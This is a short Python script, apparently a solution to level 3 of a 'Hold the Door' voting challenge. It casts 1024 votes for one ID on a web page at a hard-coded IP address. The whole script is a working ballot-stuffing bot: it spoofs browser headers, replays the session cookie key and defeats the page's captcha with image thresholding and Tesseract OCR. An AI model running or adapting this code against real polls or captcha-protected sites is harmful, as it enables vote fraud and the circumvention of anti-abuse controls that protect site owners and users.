##!/usr/bin/python3
"""Program to upload 1024 votes to level_3
of hodor project"""

import requests
import pytesseract
from PIL import Image
from io import BytesIO


# Open a session in the web page
session = requests.Session()

# Info needed for the cheat voting process
url = 'http://158.69.76.135/level3.php'
my_id = '2304'
url_captcha = 'http://158.69.76.135/captcha.php'
windows_user = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
headers = {"User-Agent": windows_user, "Referer": url}
vote_success = 'Hold the Door challenge - Level 3'


# Loop to make the 1024 votes
print("Uploading votes...")
vote = 1
while vote <= 1024:
        # Request by get method all the header info of the web page
        r = session.get(url)
        key = r.cookies['HoldTheDoor']
        cookie = {"HoldTheDoor": key}

        # Request by get method the captcha image
        r_img = session.get(url_captcha)

        # Use PIL module to get a better captcha image
        image = Image.open(BytesIO(r_img.content))
        img_bw = image.convert("L")
        captcha_img = img_bw.point(lambda x: 0 if x < 143 else 255)
        captcha = pytesseract.image_to_string(captcha_img).strip()

        # Request by post method to make the vote correctly
        params = {'id': my_id, 'holdthedoor': 'Submit', "key": key,
                  'captcha': captcha}
        response = session.post(url, data=params, cookies=cookie,
                                headers=headers)
        if response.status_code is 200 and vote_success in response.text:
                print("Upload vote #{}".format(vote))
                vote += 1
        else:
                print("Fail vote #{}".format(vote))
print("cheat online voting process ends :)")
